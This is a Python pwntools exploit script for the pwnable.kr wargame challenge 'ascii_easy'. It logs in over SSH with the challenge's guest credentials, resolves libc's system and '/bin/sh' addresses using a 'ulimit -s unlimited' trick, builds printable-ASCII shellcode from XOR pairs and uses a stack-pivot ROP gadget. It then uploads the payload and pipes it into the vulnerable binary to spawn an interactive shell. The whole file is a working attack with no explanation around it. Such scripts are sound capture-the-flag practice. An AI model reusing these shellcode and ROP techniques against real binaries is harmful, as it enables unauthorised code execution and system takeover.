#!/usr/bin/python2
from pwn import *
import sys

#setup ssh
s = ssh(host="pwnable.kr", user="ascii_easy", port=2222, password="guest")
#s.download_file("ascii_easy")
#s.download_file("/lib32/libc-2.15.so")


# set context
context(os='linux',arch='i386')
#printable charset
charset = ''.join(chr(x) for x in range(32,0x7f+1))
libc = ELF('./libc-2.15.so')
libc_base = 0x55585000 # with "ulimit -s unlimited" trick
system = libc_base + libc.symbols['system'] # resolve system address
bin_sh = libc_base + int(list(libc.search("/bin/sh"))[0]) # look for "/bin/sh" string for system's argument.

# ROP gadgets
add_esp_0x2c = libc_base + 0x13023c #shift the stack pointer to return to 0x80000000 where our shellcode place in.
call_eax = libc_base + 0x16d133 # after setup stack, we call eax (system).


def find_pair(value):
	for a in charset:
		for b in charset:
			if (ord(a) ^ ord(b)) == ord(value):
				return (a,b)

def find_pair_with_0xff(value):
	for a in "\xff":
		for b in charset:
			if (ord(a) ^ ord(b)) == ord(value):
				return (a,b)

def find_pair_xor(value,m=0):
	pair = {0:'',1:''}
	for c in p32(value):
		if m: x = find_pair_with_0xff(c)
		else: x = find_pair(c)
		pair[0] += x[0]
		pair[1] += x[1]
	return pair

def clear_eax():
	return asm(    "push 0x41414141;\
					pop eax;\
					xor eax,0x41414141;")
push_eax = lambda: asm("push eax;")

def set_eax(value,m=0):
	pair_xor = find_pair_xor(value,m)
	if m:
		return asm(	   "xor eax,{0};".format(
					u32(pair_xor[1])))
	else:
		return asm(	   "xor eax,{0};\
					xor eax,{1}".format(
					u32(pair_xor[0]),u32(pair_xor[1])))



payload = flat(
				asm("push ecx;pop esp;"),asm("dec esp;"*20),# modify-shellcode
				clear_eax(),asm("dec eax;"), #due to lack of charset, we need to -1 when eax=0, then eax changes to 0xffffffff
				set_eax(u32(asm("nop;nop;nop;ret;")),1),# return to system
				push_eax(),asm("inc esp;"*30),
				clear_eax(),set_eax(0x55576500),asm("push eax; pop esp;"),
				clear_eax(),push_eax(),set_eax(bin_sh),push_eax(),# setting up stack
				clear_eax(),push_eax(),set_eax(system),push_eax()
				)

payload = payload.ljust(0xa8+4,"C")
payload += p32(add_esp_0x2c)+"\x00"
s.upload_data(payload,"/tmp/exp_w00t")


sh = s.shell('/bin/sh')
sh.sendline('ulimit -s unlimited')
sh.sendline("(cat /tmp/exp_w00t;cat) | ~/ascii_easy;")
print "BANG!!!"

sh.interactive()
